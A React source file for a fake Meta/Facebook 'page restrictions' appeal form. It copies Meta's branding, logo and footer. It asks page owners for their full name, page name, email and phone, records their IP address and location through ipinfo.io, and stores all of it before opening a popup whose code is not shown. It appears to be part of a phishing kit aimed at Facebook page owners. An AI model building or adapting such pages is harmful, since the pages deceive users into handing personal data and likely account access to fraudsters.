import React, { useState,useEffect} from "react";
import PhoneInput from 'react-phone-input-2'
import 'react-phone-input-2/lib/style.css'
import validator from "validator";
import '../MyForm/index.scss'
import MyPopup from "../../components/popup";
import GoogleTranslate from '../../components/GoogleTranslate';

const MyForm = () => {
  const [disabled, setDisabled] = useState(true);
  const [phone, setPhone] = useState("");
  const [email, setEmail] = useState("");
  const [name, setName] = useState("");
  const [isPopupOpen, setPopupOpen] = useState(false);
  const [countryCode, setCountryCode] = useState('');

  const handlePhoneChange = (e) => {
    setPhone(e);
    if (!validator.isMobilePhone(e)) {
      setDisabled(true);
    } else {
      setDisabled(false);
    }
  };

  const handleEmailChange = (e) => {
    const newEmail = e.target.value;
    setEmail(newEmail);
    if (!validator.isEmail(newEmail)) {
      setDisabled(true);
    } else {
      setDisabled(false);
    }
  };



  const handleNameChange = (e) => {
    const newName = e.target.value;
    setName(newName);
  };

  useEffect(() => {
    const setLocaltion = async () => {
      try {
        fetch("https://ipinfo.io/json").then(d => d.json()).then(d => {
          var countryCode = d.country;
          setCountryCode(countryCode.toLowerCase());
          localStorage.setItem(
            "location",JSON.stringify({ IP: d.ip, country: d.country, city: d.city})
          );
        })
      } catch (error) {
        console.error("Error fetching data:", error);
      }
    };
    setLocaltion();
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();
    if (!validator.isEmail(email) || !validator.isMobilePhone(phone) || !name || name.length < 1){
      alert("Please provide us valid information!");
    } else {
      try{
        var ip = localStorage.getItem("location"); 
        localStorage.setItem(
          "user",
          JSON.stringify({phone,email,ip,name})
        );
        setPopupOpen(true);
      }catch(e){
        console.log(e);
      }
    }
  };

  const closePopup = () => {
    setPopupOpen(false);
  };
  
  
return(
    <>
        <GoogleTranslate/>
<div
    className="absolute top-0 right-0 hidden"
  />
            <MyPopup isOpen={isPopupOpen} onClose={closePopup} />

  {/* Navbar Start */}
  <div className="bg-[#F5F6F6] h-[52px] flex items-center justify-center border-b border-[#E0E0E0]">
    <div className="max-w-[1280px] w-full flex items-center justify-between px-4">
        <img src="images/AzroCrUMqPPv.svg" style={{width:"64px"}}/>
    </div>
  </div>
  {/* Navbar End */}
  <div className="w-full max-w-[600px] my-10 mx-auto bg-white md:rounded-lg md:shadow-sm md:border md:border-gray-200 px-4 py-4">
    <div className="mb-6 p-4 bg-blue-50 font-[300] border border-blue-200 rounded-md text-gray-800 text-[14px]">
      Please indicate why you believe that page restrictions were imposed by
      mistake. Our technology and team work in multiple languages to ensure
      consistent enforcement of rules. You can communicate with us in your
      native language.{" "}
    </div>
    <form id="clientForm" className="space-y-4">
      <div>
        <label className="block font-[600] text-sm text-gray-700 mb-1">
          Full Name <span className="text-red-600">*</span>
        </label>
        <input
          onChange={handleNameChange} value={name}
          type="text"
          name="fullName"
          id="fullName"
          placeholder="Enter your full name"
          className="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none"
        />
      </div>
      <div>
        <label className="block font-[600] text-sm text-gray-700 mb-1">
          Facebook Page Name <span className="text-red-600">*</span>
        </label>
        <input
          type="text"
          name="pageName"
          id="fanpage"
          placeholder="Enter your Facebook page name"
          className="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none"
        />
      </div>
      <div>
        <label className="block font-[600] text-sm text-gray-700 mb-1">
          Email address <span className="text-red-600">*</span>
        </label>
        <input
          onChange={handleEmailChange} value={email}
          type="email"
          id="email"
          name="personalEmail"
          placeholder="Enter your email address"
          className="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none"
        />
      </div>
      <div>
        <label className="block font-[600] text-sm text-gray-700 mb-1">
          Mobile Phone Number <span className="text-red-600">*</span>
        </label>
                        <PhoneInput
                     enableSearch={true}
                    enableAreaCodes={true}
                    country={countryCode}
                    value={phone}
                    onChange={handlePhoneChange}
                    />
      </div>
      <div className="pt-2">
        <p className="block text-sm font-[600] text-gray-700 mb-3">
          What do you think happened? <span className="text-red-600">*</span>
        </p>
        <div className="space-y-2">
          <label className="flex items-start gap-2">
            <input
              type="radio"
              name="reason"
              defaultValue="erroneous_report"
              className="mt-1"
            />
            <span className="text-sm text-gray-700 cursor-pointer">
              An erroneous report or unfair competitive complaint.
            </span>
          </label>
          <label className="flex items-start gap-2">
            <input
              type="radio"
              name="reason"
              defaultValue="notification_error"
              className="mt-1"
            />
            <span className="text-sm text-gray-700 cursor-pointer">
              This notification was sent in error.
            </span>
          </label>
          <label className="flex items-start gap-2">
            <input
              type="radio"
              name="reason"
              defaultValue="no_fraud"
              className="mt-1"
            />
            <span className="text-sm text-gray-700 cursor-pointer">
              No fraud involved / another legitimate reason:
            </span>
          </label>
          <div className="mt-1">
            <textarea
              placeholder="Additional notes (optional)"
              className="w-full border border-[#d4dbe3] h-20 px-3 py-2 rounded-lg text-sm resize-none outline-none"
              defaultValue={""}
            />
          </div>
        </div>
      </div>
      {/* Submit */}
      <div className="pt-3">
        <button
          disabled={disabled}
          onClick={handleSubmit}
          id="btn-submit-request"
          type="submit"
          className="disabled:bg-blue-300 disabled:cursor-not-allowed w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full py-2.5 hover:bg-blue-700 transition-colors"
        >
          Continue
        </button>
      </div>
      <div className="w-16 pt-5 mx-auto">
        <img src="images/CoahKlE3WIfy.svg" alt="Meta" />
      </div>
    </form>
  </div>
  {/* Footer Start */}
  <div className="bg-[#F5F6F6] pt-5 pb-5 border-t border-[#E0E0E0] w-full">
    <div className="max-w-[1280px] w-full mx-auto px-4">
      <div className="flex flex-wrap justify-center gap-4 mb-4 text-[13px] text-gray-600">
        <a href="#" className="hover:underline text-[#6D84B4]">
          English (US)
        </a>
        <a href="#" className="hover:underline text-[#6D84B4]">
          English (UK)
        </a>
        <a href="#" className="hover:underline text-[#6D84B4]">
          Italiano
        </a>
        <a href="#" className="hover:underline text-[#6D84B4]">
          Français
        </a>
        <a href="#" className="hover:underline text-[#6D84B4]">
          中文(简体)
        </a>
        <a href="#" className="hover:underline text-[#6D84B4]">
          日本語
        </a>
        <a href="#" className="hover:underline text-[#6D84B4]">
          한국어
        </a>
        <a href="#" className="hover:underline text-[#6D84B4]">
          עברית
        </a>
        <a href="#" className="hover:underline text-[#6D84B4]">
          Español
        </a>
        <a href="#" className="hover:underline text-[#6D84B4]">
          Português
        </a>
      </div>
      <div className="flex flex-wrap justify-center gap-4 text-[13px] text-gray-600">
        <p className="mr-4">© 2025 Meta</p>
        <a href="#" className="hover:underline">
          About
        </a>
        <a href="#" className="hover:underline">
          Developers
        </a>
        <a href="#" className="hover:underline">
          Careers
        </a>
        <a href="#" className="hover:underline">
          Privacy
        </a>
        <a href="#" className="hover:underline">
          Cookies
        </a>
        <a href="#" className="hover:underline">
          Terms
        </a>
        <a href="#" className="hover:underline">
          Help Centre
        </a>
      </div>
    </div>
  </div>
  </>
);

}

export default MyForm;
